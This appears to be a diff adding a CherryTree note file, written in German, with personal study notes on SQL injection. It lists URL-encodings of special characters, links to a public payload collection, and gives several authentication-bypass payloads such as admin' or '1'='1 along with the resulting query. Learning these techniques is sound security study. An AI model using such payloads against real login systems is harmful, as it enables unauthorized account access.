@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="25" master_id="0" name="injection" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747392531" ts_lastsave="1747397104">
+    <rich_text>Url Encdoing für escapes
+
+
+&#13;
+Standard:
+
+Oft mit leerzeichen noch nach -- -&gt; also beides ausprobieren
+
+
+All:
+</rich_text>
+    <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass</rich_text>
+    <rich_text>
+
+
+
+weil daraus wird:
+
+</rich_text>
+    <table char_offset="26" justification="left" col_min="50" col_max="50" col_widths="0,0">
+      <row>
+        <cell>'</cell>
+        <cell>%27</cell>
+      </row>
+      <row>
+        <cell>"</cell>
+        <cell>%22</cell>
+      </row>
+      <row>
+        <cell>#</cell>
+        <cell>%23</cell>
+      </row>
+      <row>
+        <cell>;</cell>
+        <cell>%3B</cell>
+      </row>
+      <row>
+        <cell>)</cell>
+        <cell>%29</cell>
+      </row>
+      <row>
+        <cell>)</cell>
+        <cell>%29</cell>
+      </row>
+      <row>
+        <cell>Payload</cell>
+        <cell>URL Encodedd</cell>
+      </row>
+    </table>
+    <codebox char_offset="40" justification="left" frame_width="603" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">admin:D';--</codebox>
+    <codebox char_offset="103" justification="left" frame_width="603" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">admin')-- </codebox>
+    <codebox char_offset="105" justification="left" frame_width="603" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">admin' or '1'='1		Basic Auth Bypass&#13;
+admin')-- -				Basic Auth Bypass With comments</codebox>
+    <codebox char_offset="235" justification="left" frame_width="756" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';</codebox>
+  </node>
+</cherrytree>
